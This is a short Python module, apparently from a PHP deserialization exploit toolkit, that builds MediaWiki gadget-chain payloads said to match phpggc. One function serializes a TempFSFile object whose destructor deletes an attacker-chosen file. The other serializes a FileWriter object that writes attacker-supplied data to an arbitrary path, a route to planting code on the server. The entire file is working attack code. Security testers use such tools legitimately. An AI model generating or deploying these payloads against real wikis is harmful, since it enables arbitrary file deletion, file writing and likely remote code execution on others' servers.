"""MediaWiki gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

from ..platform import maybe_wrap
from ..serialize import php_bool, php_obj, php_str, prot


def build_fd1(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    temp = php_obj("Wikimedia\\FileBackend\\FSFile\\TempFSFile", [
        (prot("canDelete"), php_bool(True)),
        (prot("path"), php_str(remote_path)),
    ])
    return maybe_wrap(temp, fast_destruct)


def build_fw1(remote_path: str, data: str, *, fast_destruct: bool = False) -> bytes:
    writer = php_obj("JakubOnderka\\PhpParallelLint\\FileWriter", [
        (prot("logFile"), php_str(remote_path)),
        (prot("buffer"), php_str(data)),
    ])
    return maybe_wrap(writer, fast_destruct)
